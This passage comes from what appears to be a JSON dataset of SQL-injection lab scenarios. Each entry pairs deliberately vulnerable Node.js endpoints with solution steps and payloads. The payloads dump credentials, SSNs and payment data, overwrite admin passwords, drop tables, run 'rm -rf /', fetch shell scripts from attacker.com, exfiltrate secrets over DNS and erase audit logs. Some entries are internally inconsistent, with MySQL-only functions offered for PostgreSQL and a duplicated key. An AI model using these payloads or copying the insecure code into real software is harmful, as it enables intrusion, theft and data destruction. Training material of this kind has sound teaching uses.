    "srcCode": "app.post('/soap/login', (req, res) => {\n  const xml = req.rawBody;\n  const user = extractXPath(xml, '//username');\n  const query = `SELECT * FROM users WHERE username='${user}'`;\n  db.get(query, (err, row) => {\n    res.send(`<success>${!!row}</success>`);\n  });\n});",
    "payloads": [
      "' OR CASE WHEN (SUBSTR(password,1,1)='a') THEN randomblob(100000000) END--",
      "' OR CASE WHEN (LENGTH(password)=32) THEN randomblob(100000000) END--"
    ]
  },
  {
    "Lab scenario": "E-Commerce GROUP BY SQLi with UNION Payloads",
    "Lab Description": "A product grouping feature uses unsanitized input in GROUP BY. The application returns grouped results as JSON. To solve: Extract database schema via UNION-based injection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept /products?group=category request",
      "Determine column count with ORDER BY",
      "Inject: group=category UNION SELECT sql,NULL FROM sqlite_master--",
      "Parse schema details from JSON response",
      "Extract table structures for users and orders"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/products', (req, res) => {\n  const group = req.query.group || 'category';\n  const query = `SELECT ${group}, COUNT(*) FROM products GROUP BY ${group}`;\n  db.all(query, (err, rows) => {\n    res.json(rows);\n  });\n});",
    "payloads": [
      "category UNION SELECT tbl_name, sql FROM sqlite_master--",
      "price UNION SELECT NULL, group_concat(tbl_name) FROM sqlite_master--"
    ]
  },
  {
    "Lab scenario": "Newsletter Signup Error-Based SQLi with URL Encoding",
    "Lab Description": "A newsletter endpoint uses URL parameters directly in SQL. Verbose errors leak database information. To solve: Extract subscriber emails via UNION-based error injection.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Send GET /subscribe?email=test%40test.com",
      "Trigger error: 'test%27 AND 1=CAST(version() AS INTEGER)--",
      "Extract DB version from error message",
      "Inject UNION SELECT to dump emails",
      "Parse emails from HTML response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/subscribe', (req, res) => {\n  const email = req.query.email;\n  db.run(`INSERT INTO subscribers(email) VALUES('${email}')`, (err) => {\n    if (err) res.status(500).send(`Error: ${err.message}`);\n    else res.send('Subscribed!');\n  });\n});",
    "payloads": [
      "test%40test.com' UNION SELECT email FROM subscribers--",
      "test' AND 1=CAST((SELECT group_concat(email) FROM subscribers) AS INTEGER)--"
    ]
  },
  {
    "Lab scenario": "SQLite Stacked Queries in Login Form",
    "Lab Description": "A login form allows stacked queries in SQLite. To solve: Update the admin password and authenticate.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit username: admin'; UPDATE users SET password='pwned' WHERE username='admin'--",
      "Log in with username: admin and password: pwned",
      "Verify access to admin dashboard"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/login', (req, res) => {\n  const { user, pass } = req.body;\n  db.get(`SELECT * FROM users WHERE username='${user}' AND password='${pass}'`, (err, row) => {\n    res.send(row ? 'Success' : 'Failed');\n  });\n});",
    "payloads": [
      "admin'; INSERT INTO users(username, password) VALUES ('attacker', 'pwned')--",
      "admin'; DROP TABLE users--"
    ]
  },
  {
    "Lab scenario": "AJAX Autocomplete UNION SQLi in LIKE Clause",
    "Lab Description": "An autocomplete endpoint uses unsanitized input in a LIKE clause. To solve: Extract user emails via UNION injection.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Send GET /autocomplete?q=a%25",
      "Inject: %' UNION SELECT email FROM users--",
      "Observe emails in JSON response",
      "Refine payload to extract all records"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/autocomplete', (req, res) => {\n  const term = req.query.q || '';\n  db.all(`SELECT name FROM products WHERE name LIKE '%${term}%'`, (err, rows) => {\n    res.json(rows);\n  });\n});",
    "payloads": [
      "%' UNION SELECT email FROM users--",
      "%' UNION SELECT password FROM users WHERE username='admin'--"
    ]
  },
  {
    "Lab scenario": "Blog Comment Form INSERT-Based SQLi with Error Extraction",
    "Lab Description": "The blog comment system directly interpolates user input into an INSERT statement. While UNION injection isn't possible, error messages leak schema information. To solve: Extract table names via error-based SQLi.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit comment with author: '||(SELECT 1/0 FROM sqlite_master)--",
      "Analyze error message for database schema details",
      "Iterate payloads to reveal table structures",
      "Extract credentials using CAST-based errors"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/comment', (req, res) => {\n  const { author, comment } = req.body;\n  const query = `INSERT INTO comments (author, comment) VALUES ('${author}', '${comment}')`;\n  db.run(query);\n  res.redirect('/blog');\n});",
    "payloads": [
      "'||(SELECT load_extension('invalid'))--",
      "'||(SELECT 1 FROM sqlite_master WHERE tbl_name='users' AND 1=CAST(randomblob(1000000000) AS INTEGER))--"
    ]
  },
  {
    "Lab scenario": "Cookie-Based Authentication Bypass with Tautology",
    "Lab Description": "Session validation uses cookies in a WHERE clause without sanitization. To solve: Bypass authentication using boolean logic and access admin profile.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept request and modify session cookie to: admin' OR '1'='1'--",
      "Bypass authentication through tautological WHERE clause",
      "Access privileged endpoints with valid session"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/profile', (req, res) => {\n  const session = req.cookies.session_id;\n  const query = `SELECT * FROM sessions WHERE session_id='${session}'`;\n  db.get(query, [], (err, user) => {\n    res.render('profile', { user });\n  });\n});",
    "payloads": [
      "admin' OR EXISTS(SELECT 1 FROM users WHERE username='admin')--",
      "xyz' UNION SELECT 1,'admin','admin'--"
    ]
  },
  {
    "Lab scenario": "API Key Validation UNION SQLi with Column Matching",
    "Lab Description": "API key validation vulnerable to UNION injection. To solve: Determine column count and extract user credentials through careful UNION payload construction.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Determine column count using ORDER BY",
      "Identify string-compatible columns with NULL placeholders",
      "Inject: ' UNION SELECT username,password,NULL FROM users--",
      "Parse credentials from API response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/api/data', (req, res) => {\n  const key = req.query.key;\n  const query = `SELECT id, key, created_at FROM api_keys WHERE key='${key}'`;\n  db.get(query, [], (err, result) => {\n    if (result) res.json({ data: \"secure data\" });\n    else res.status(403).send(\"Invalid key\");\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL,NULL,NULL--",
      "' UNION SELECT username,password,NULL FROM users--"
    ]
  },
  {
    "Lab scenario": "Second-Order SQLi in Analytics Report Generation",
    "Lab Description": "Bio field stored without sanitization and later used in admin reports. To solve: Poison bio field with SQL that executes during report generation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Update bio to: ', (SELECT group_concat(email) FROM users))--",
      "Trigger admin report generation",
      "Extract emails from corrupted report output"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/admin/report', (req, res) => {\n  db.all(`SELECT id, bio FROM users`, [], (err, rows) => {\n    res.send(rows.map(r => `${r.id}: ${r.bio}`).join('<br>'));\n  });\n});",
    "payloads": [
      "', (SELECT sql FROM sqlite_master))--",
      "', (SELECT hex(password) FROM users WHERE id=1))--"
    ]
  },
  {
    "Lab scenario": "Dynamic Table Name SQLi with System Table Access",
    "Lab Description": "Table parameter vulnerable to schema enumeration. To solve: Extract database structure through controlled UNION attacks.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Determine base table column count",
      "Inject: (SELECT name FROM sqlite_master LIMIT 1) UNION SELECT name,sql FROM sqlite_master--",
      "Analyze response for schema details",
      "Extract credentials from discovered tables"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/admin', (req, res) => {\n  const table = req.query.table;\n  const query = `SELECT name, type FROM ${table}`;\n  db.all(query, [], (err, rows) => {\n    res.json(rows);\n  });\n});",
    "payloads": [
      "(SELECT name FROM sqlite_master) UNION SELECT tbl_name,sql FROM sqlite_master--",
      "users UNION SELECT name,password FROM users--"
    ]
  },
  {
    "Lab scenario": "JSON Body SQLi with Content-Type Bypass",
    "Lab Description": "API endpoint vulnerable through JSON parameter injection. To solve: Bypass Content-Type validation and extract sensitive data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Set Content-Type: application/json",
      "Send payload: {\"username\": \"admin' UNION SELECT NULL,password,NULL FROM users--\"}",
      "Handle JSON parsing errors through response analysis",
      "Extract hashed passwords from nested responses"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/user-info', (req, res) => {\n  const username = req.body.username;\n  const query = `SELECT id, username, role FROM users WHERE username='${username}'`;\n  db.get(query, [], (err, user) => {\n    res.json(user);\n  });\n});",
    "payloads": [
      "admin' UNION SELECT 1,password,1 FROM users--",
      "admin' AND 1=CAST((SELECT COUNT(*) FROM users) AS INTEGER)--"
    ]
  },
  {
    "Lab scenario": "Error-Based Password Recovery SQLi",
    "Lab Description": "Password recovery form leaks schema through verbose errors. To solve: Extract table structure via type conversion errors.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit email: ' AND (SELECT 1 FROM sqlite_master WHERE tbl_name='users')=1--",
      "Analyze error message for schema validation",
      "Brute-force column names using incremental CAST operations"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/forgot-password', (req, res) => {\n  const email = req.body.email;\n  const query = `SELECT * FROM users WHERE email='${email}'`;\n  db.get(query, [], (err, user) => {\n    if (err) res.status(500).send(`Error: ${err.message}`);\n    else res.send(user ? \"Email sent\" : \"Invalid email\");\n  });\n});",
    "payloads": [
      "' AND 1=CAST((SELECT sql FROM sqlite_master LIMIT 1) AS INTEGER)--",
      "' AND (SELECT LENGTH(password) FROM users WHERE email='admin@example.com')=60--"
    ]
  },
  {
    "Lab scenario": "Verification Token SQLi with Stacked Queries",
    "Lab Description": "Verification endpoint vulnerable to stacked queries in PostgreSQL. To solve: Escalate privileges through batched SQL commands.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Craft token parameter: '; UPDATE users SET role='admin' WHERE email='user@example.com';--",
      "Trigger verification endpoint",
      "Confirm privilege escalation through admin panel access"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/verify', (req, res) => {\n  const token = req.query.token;\n  const query = `UPDATE users SET verified=true WHERE token='${token}'`;\n  db.run(query);\n  res.send(\"Verified\");\n});",
    "payloads": [
      "'; INSERT INTO users(email, role) VALUES ('attacker@test.com','admin');--",
      "'; DROP TABLE audit_logs;--"
    ]
  },
  {
    "Lab scenario": "Pagination SQLi with OFFSET Clause Manipulation",
    "Lab Description": "Pagination logic vulnerable through OFFSET parameter. To solve: Inject UNION payload into numeric parameter to extract database version.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Bypass numeric validation using scientific notation: 0e0 UNION SELECT sqlite_version()--",
      "Handle type conversion errors through nested queries",
      "Extract DB version from JSON response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/products', (req, res) => {\n  const page = Number(req.query.page);\n  const size = Number(req.query.size);\n  const query = `SELECT * FROM products LIMIT ${size} OFFSET ${page * size}`;\n  db.all(query, [], (err, rows) => {\n    res.json(rows);\n  });\n});",
    "payloads": [
      "0 UNION SELECT 1,2,sqlite_version(),4--",
      "0 AND 1=CAST((SELECT name FROM sqlite_master) AS INTEGER)--"
    ]
  },
  {
    "Lab scenario": "E-Commerce Portal UNION-Based SQLi in ORDER BY Clause",
    "Lab Description": "Product sorting feature in Node.js application directly concatenates user input into ORDER BY clause. The application returns full query errors. To solve: Extract user credentials through UNION attack requiring column type matching.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept /products?sort= request with Burp Suite",
      "Determine column count: ' ORDER BY 5--",
      "Identify string columns: ' UNION SELECT 'a','b','c','d','e'--",
      "Extract credentials: ' UNION SELECT username,password,NULL,NULL,NULL FROM users--",
      "Verify via login API endpoint"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst db = require('./database');\n\napp.get('/products', (req, res) => {\n  const sort = req.query.sort || 'id';\n  const query = `SELECT id,name,price FROM products ORDER BY ${sort}`;\n  \n  db.query(query, (err, result) => {\n    if(err) {\n      console.error('Full query:', query, '\\nError:', err); // Error leakage\n      res.status(500).send('Error: ' + err.message);\n    } else {\n      res.json(result.rows);\n    }\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
      "' UNION SELECT username,password,1,1,1 FROM users--",
      "' ORDER BY (SELECT 1 FROM users WHERE username='admin')--"
    ]
  },
  {
    "Lab scenario": "Healthcare API Boolean-Based Blind SQLi in WHERE Clause",
    "Lab Description": "Patient lookup API returns HTTP 200/404 status codes based on query results. No error messages. To solve: Determine sensitive patient SSN through binary search character extraction.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture POST /api/patient-lookup with OWASP ZAP",
      "Identify boolean condition: ' OR 1=1 AND 'a'='a",
      "Automate with sqlmap: sqlmap -r request.txt --technique=B --dbms=PostgreSQL",
      "Brute-force SSN using substring comparisons",
      "Validate through insurance claim endpoint"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/patient-lookup', (req, res) => {\n  const patientId = req.body.id;\n  const query = `SELECT * FROM patients WHERE id='${patientId}' AND is_active=true`;\n  \n  db.query(query, (err, result) => {\n    if(result.rows.length > 0) {\n      res.status(200).send({found: true});\n    } else {\n      res.status(404).send({found: false});\n    }\n  });\n});",
    "payloads": [
      "' OR (SELECT SUBSTRING(ssn,1,1) FROM patients LIMIT 1)='5'--",
      "' AND (SELECT LENGTH(ssn) FROM patients WHERE id=1)=9--"
    ]
  },
  {
    "Lab scenario": "IoT Device Manager Time-Based SQLi in GROUP BY Clause",
    "Lab Description": "Device analytics dashboard vulnerable to blind injection through GROUP BY parameter. Responses identical but delay observable. To solve: Exfiltrate API keys through conditional response delays.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept /analytics request with Burp Suite",
      "Identify injectable parameter: group=day",
      "Confirm time delay: '; SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE NULL END--",
      "Brute-force API key character by character",
      "Use extracted key in device control API"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/analytics', (req, res) => {\n  const group = req.query.group;\n  const query = `SELECT COUNT(*), ${group} FROM devices GROUP BY ${group}`;\n  \n  db.query(query, (err, result) => {\n    // No error returned\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "; SELECT CASE WHEN (ASCII(SUBSTR(api_key,1,1))>100 THEN pg_sleep(5) ELSE NULL END FROM devices--",
      " UNION SELECT NULL,(SELECT pg_sleep(5) FROM api_keys)--"
    ]
  },
  {
    "Lab scenario": "CMS Platform Error-Based SQLi in HAVING Clause",
    "Lab Description": "Content analytics page leaks PostgreSQL errors through misconfigured HAVING clause. To solve: Extract admin credentials through verbose error messages.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept /analytics request with Burp Suite",
      "Trigger error: ' HAVING 1=CAST((SELECT version()) AS INT)--",
      "Extract table names from error messages",
      "Retrieve credentials using CTE expressions",
      "Bypass WAF using URL encoding"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/analytics', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT category, COUNT(*) FROM posts GROUP BY category HAVING ${filter}`;\n  \n  db.query(query, (err, result) => {\n    if(err) res.status(500).send(err.toString()); // Error leakage\n    else res.json(result.rows);\n  });\n});",
    "payloads": [
      "1=CAST((SELECT current_database()) AS INTEGER)--",
      "1=1 AND (SELECT 1 FROM users WHERE username='admin')=1--"
    ]
  },
  {
    "Lab scenario": "Banking Portal Second-Order SQLi in User Registration",
    "Lab Description": "User registration stores unsanitized input used in batch reports. To solve: Trigger scheduled report generation to exfiltrate account balances.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Register user with malicious comment: ' || (SELECT balance FROM accounts))--",
      "Wait for nightly report generation",
      "Monitor system logs for SQL errors",
      "Extract data through error-based injection",
      "Clean audit logs using stacked queries"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/register', (req, res) => {\n  const comment = req.body.comment;\n  const query = `INSERT INTO users (username, comment) VALUES ('${req.body.user}', '${comment}')`;\n  \n  db.query(query, () => {\n    res.send('Registration pending approval');\n  });\n});",
    "payloads": [
      "'||(SELECT balance FROM accounts WHERE user='admin')--",
      "'; UPDATE accounts SET balance=1000000 WHERE user='attacker'--"
    ]
  },
  {
    "Lab scenario": "REST API Gateway UNION SQLi in JSON Parameter",
    "Lab Description": "Inventory API processes JSON array input without validation. To solve: Bypass WAF protections and extract database schema through UNION attacks.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Modify Content-Type to application/json",
      "Craft JSON payload: {\"filter\":[\"1' UNION SELECT version(),NULL--\"]}",
      "Bypass WAF using Unicode escapes: \\u0027 UNION...",
      "Extract schema via information_schema.tables",
      "Encode results in base64"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/inventory', (req, res) => {\n  const filters = req.body.filter.join(' AND ');\n  const query = `SELECT * FROM products WHERE ${filters}`;\n  \n  db.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "\"1' UNION SELECT table_name,column_name FROM information_schema.columns--",
      "\"1' UNION SELECT encode(convert_to(pg_read_file('/etc/passwd'),'base64'),'hex'--"
    ]
  },
  {
    "Lab scenario": "Government Portal Out-of-Band SQLi in PDF Generator",
    "Lab Description": "Report generation feature allows DNS exfiltration through malicious SQL queries. To solve: Extract sensitive records using OOB techniques.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Set up DNS listener with Burp Collaborator",
      "Craft payload: ' || (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users),'.attacker.com\\\\test.txt')))--",
      "Trigger PDF report generation",
      "Monitor DNS queries for exfiltrated data",
      "Bypass firewall using alternate protocols"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/generate-report', (req, res) => {\n  const params = req.body.params;\n  const query = `SELECT * FROM citizens WHERE ${params}`;\n  \n  // Runs query and generates PDF\n  generatePDF(query);\n});",
    "payloads": [
      "' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.attacker.com\\test'))--",
      "'||(SELECT MAKE_SET(2063,CONCAT('exfil.',(SELECT password))))--"
    ]
  },
  {
    "Lab scenario": "Social Media Platform Filter Evasion SQLi",
    "Lab Scenario": "Search feature with WAF blocking common SQLi patterns. To solve: Bypass filters using alternative syntax and encoding.",
    "Lab Description": "The application uses a web application firewall blocking UNION and SELECT keywords. To solve: Extract user emails using alternative syntax and comment bypasses.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify allowed characters using Postman fuzzing",
      "Bypass WAF using %00 NULL bytes",
      "Use alternative syntax: ' || (SELECT 1 FROM users)::text --",
      "Exfiltrate data via case-sensitive keywords",
      "Use alternative comment syntax: /*!50000SELECT*/"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const term = req.query.q.replace(/[;'-]/g, '');\n  const query = `SELECT * FROM posts WHERE content LIKE '%${term}%'`;\n  \n  db.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "'%00UNION%00SELECT%00email%00FROM%00users--",
      "'/**/OR/**/1=(SELECT/**/COUNT(*)/**/FROM/**/users)--"
    ]
  },
  {
    "Lab scenario": "Education Platform JWT-Triggered SQLi",
    "Lab Description": "User dashboard vulnerable to SQLi through JWT claims. To solve: Modify JWT to inject SQL payloads through user ID claim.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Decode JWT using jwt.io",
      "Modify sub claim to: ' OR admin=true--",
      "Sign with null signature algorithm",
      "Extract password hashes via UNION attack",
      "Crack hashes using John The Ripper"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/dashboard', (req, res) => {\n  const userId = jwtVerify(req.cookies.token).sub;\n  const query = `SELECT * FROM users WHERE id='${userId}'`;\n  \n  db.query(query, (err, result) => {\n    res.json(result.rows[0]);\n  });\n});",
    "payloads": [
      "' UNION SELECT password,NULL FROM users--",
      "'; UPDATE users SET password='hacked' WHERE id='admin'--"
    ]
  },
  {
    "Lab scenario": "Logistics Tracking System Polyglot SQLi in XML Parameter",
    "Lab Description": "Shipment tracking API vulnerable through XML/SQL polyglot payloads. To solve: Achieve RCE via stacked queries and COPY FROM PROGRAM.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Craft XML payload containing SQL statements",
      "Bypass parser using CDATA sections",
      "Execute OS commands: '; COPY logs FROM PROGRAM 'curl attacker.com/shell.sh'--",
      "Create reverse shell using netcat",
      "Clean logs using VACUUM command"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/track', (req, res) => {\n  const xml = req.body.xml;\n  const trackingId = extractXPath(xml, '//id');\n  const query = `SELECT * FROM shipments WHERE id='${trackingId}'`;\n  \n  db.query(query, (err, result) => {\n    res.xml(result.rows);\n  });\n});",
    "payloads": [
      "'%3BCOPY%20files%20FROM%20PROGRAM%20'rm%20-rf%20/'--",
      "<![CDATA[' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--]]>"
    ]
  },
  {
    "Lab scenario": "Healthcare Portal Error-Based SQLi in HAVING Clause",
    "Lab Description": "A hospital's patient statistics dashboard allows filtering by department and uses the user input directly in the HAVING clause of a SQL query. Due to lack of input sanitization, attackers can trigger error-based SQL injection to extract sensitive database metadata. This lab demonstrates exploitation using PostgreSQL type casting errors and common table expressions (CTEs) to enumerate tables and leak medical record IDs.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the GET /stats request using Burp Suite or a proxy tool",
      "Inject into the filter parameter: 1=CAST((SELECT current_database()) AS INTEGER)--",
      "Observe the error message returned by PostgreSQL and use it to infer schema names",
      "Construct payloads with UNION or CTE to enumerate medical records"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/stats', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT department, COUNT(*) FROM patients GROUP BY department HAVING ${filter}`;\n  pool.query(query, (err, result) => {\n    if(err) res.status(500).send(err.toString());\n    else res.json(result.rows);\n  });\n});",
    "payloads": [
      "1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INTEGER)--",
      "1=1 AND (SELECT 1 FROM patient_records WHERE ssn LIKE '123%')=1--"
    ]
  },
  {
    "Lab scenario": "IoT Device Time-Based SQLi via MQTT Protocol",
    "Lab Description": "An MQTT broker receives JSON-encoded telemetry data from smart devices and writes it to a SQL database. Since the MQTT handler does not sanitize incoming values, attackers can inject SQL into the `device_id` field. This lab explores time-based SQL injection to exfiltrate API keys from the database by measuring conditional delays caused by `pg_sleep`.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture MQTT messages from a compromised or test IoT device",
      "Inject a time delay: '; SELECT CASE WHEN (ASCII(SUBSTR(api_key,1,1))>100) THEN pg_sleep(5) END FROM devices--",
      "Use a timing-based measurement tool or script to determine when delays occur",
      "Automate full key extraction using a binary search script"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "mqttClient.on('message', (topic, msg) => {\n  const data = JSON.parse(msg);\n  const query = `INSERT INTO telemetry (device_id, value) VALUES ('${data.id}', '${data.value}')`;\n  pool.query(query);\n});",
    "payloads": [
      "'; SELECT pg_sleep(5) FROM devices WHERE id=1--",
      "'||(SELECT CASE WHEN (SELECT COUNT(*) FROM api_keys)=3 THEN pg_sleep(2) END)--"
    ]
  },
  {
    "Lab scenario": "CMS Second-Order SQLi in User Registration",
    "Lab Description": "A content management system stores user input during registration and later uses it unsanitized during scheduled report generation. This lab demonstrates second-order SQL injection, where malicious data triggers SQL execution not during entry, but during later backend processing (e.g., admin reporting or logs).",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Register with a malicious username: admin'||(SELECT CURRENT_USER))--",
      "Wait for the system to run its daily scheduled report that includes user data",
      "Review the exported report or admin panel for executed SQL results"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/register', (req, res) => {\n  const username = req.body.username;\n  const query = `INSERT INTO users (username) VALUES ('${username}')`;\n  pool.query(query);\n  res.send('Pending approval');\n});",
    "payloads": [
      "test'||(SELECT pg_read_file('/etc/passwd'))--",
      "admin'||(COPY (SELECT * FROM secrets) TO PROGRAM 'curl attacker.com?exfil=$(data)'--"
    ]
  },
  {
    "Lab scenario": "Banking Portal Boolean-Blind SQLi in Transaction Search",
    "Lab Description": "The transaction search feature returns true/false based on user-defined queries. Since there's no direct error or output, Boolean-based blind SQL injection is needed. Attackers can infer information like account balances by manipulating the query logic and observing application behavior.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Craft queries with true/false conditions using the AND operator",
      "Submit queries via the /search endpoint and observe response changes",
      "Use tools like sqlmap with --technique=B for automated exploitation",
      "Perform binary search to guess numeric values like balances"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/search', (req, res) => {\n  const query = req.body.query;\n  const sql = `SELECT EXISTS(SELECT 1 FROM transactions WHERE ${query})`;\n  pool.query(sql, (err, result) => {\n    res.json({ found: result.rows[0].exists });\n  });\n});",
    "payloads": [
      "description LIKE '%test%' AND (SELECT SUBSTR(CAST(balance AS TEXT),1,1) FROM accounts)='5'--",
      "amount > 0 AND (SELECT COUNT(*) FROM users WHERE username='admin')=1--"
    ]
  },
  {
    "Lab scenario": "E-Commerce Filter Evasion SQLi with Unicode Bypass",
    "Lab Description": "The product search field filters user input by stripping single quotes, but it fails to detect alternate encodings. Attackers can exploit this by using Unicode-encoded apostrophes to bypass the sanitization and extract payment data from the backend.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send URL-encoded requests using %u0027 instead of standard apostrophes",
      "Inject UNION SELECT queries using alternate encodings",
      "Decode hex or base64-encoded results returned in JSON"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const term = req.query.q.replace(/'/g, '');\n  const query = `SELECT * FROM products WHERE name LIKE '%${term}%'`;\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "%u0027 UNION SELECT NULL,pan,NULL FROM payments--",
      "%u0027 OR 1=CAST((SELECT COUNT(*) FROM payments) AS INTEGER)--"
    ]
  },
  {
    "Lab scenario": "Logistics Tracking Out-of-Band SQLi via DNS",
    "Lab Description": "A vulnerable shipment tracker constructs SQL queries from user input and allows attackers to trigger out-of-band SQLi using DNS exfiltration. This lab illustrates exfiltrating AWS keys via DNS queries using the `LOAD_FILE` or `MAKE_SET` functions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Deploy a DNS listener or Burp Collaborator server",
      "Craft payloads that call out to your DNS server with secrets",
      "Monitor DNS logs for stolen data",
      "Use the stolen data in an AWS environment"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/track', (req, res) => {\n  const id = req.query.id;\n  const query = `SELECT * FROM shipments WHERE id='${id}'`;\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "'||(SELECT MAKE_SET(2063,CONCAT('exfil.',(SELECT secret_key)))--",
      "' UNION SELECT NULL,ENCODE(pg_read_binary_file('/etc/passwd'),'base64')--"
    ]
  },
  {
    "Lab scenario": "Social Media JWT-Triggered SQLi in Profile Load",
    "Lab Description": "The application uses JWT tokens and places the 'sub' claim directly into SQL queries to load user profiles. An attacker can forge a token and manipulate the claim to perform SQL injection. This lab demonstrates bypassing authentication and accessing another user's messages.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Decode the JWT token and modify the 'sub' field to: ' OR 1=1--",
      "Re-sign the token using 'alg':'none' or a leaked key",
      "Access the /profile endpoint with the modified JWT",
      "Review the returned messages"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/profile', (req, res) => {\n  const userId = jwtVerify(req.headers.authorization).sub;\n  const query = `SELECT * FROM users WHERE id='${userId}'`;\n  pool.query(query, (err, result) => {\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL,message,NULL FROM inbox--",
      "'||(SELECT group_concat(message) FROM inbox)--"
    ]
  },
  {
    "Lab scenario": "Education Platform Stacked SQLi in CSV Export",
    "Lab Description": "An export feature accepts filtering criteria in a query used in PostgreSQL's COPY command. Lack of sanitization allows stacked SQL queries. This lab shows how attackers can chain malicious SQL to perform remote command execution (RCE) via COPY FROM PROGRAM.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Inject a stacked query into the export filter: ; COPY grades FROM PROGRAM 'curl https://attacker.com/shell.sh'--",
      "Trigger the report/export generation",
      "Verify RCE by checking listener or shell connection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/export', (req, res) => {\n  const filter = req.query.filter;\n  const query = `COPY (SELECT * FROM grades WHERE ${filter}) TO STDOUT CSV`;\n  pool.query(query);\n  res.attachment('grades.csv');\n});",
    "payloads": [
      "; CREATE TABLE exfil AS SELECT * FROM passwords--",
      "; DROP TABLE audit_logs;--"
    ]
  },
  {
    "Lab scenario": "Government Portal XML SQLi in SOAP Service",
    "Lab Description": "A SOAP endpoint accepts XML input and uses XPath to extract user input before inserting it into a SQL query. This allows hybrid XML-SQL injection. Attackers can use CDATA or entity expansion to inject SQL and retrieve citizen SSNs from the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Craft an XML payload with SQL injection wrapped in CDATA",
      "Submit to the /soap endpoint",
      "Parse the resulting XML for leaked data",
      "Use entity encoding to bypass XML parsers"
    ],
    "Vulnerability name": "SQL injection",
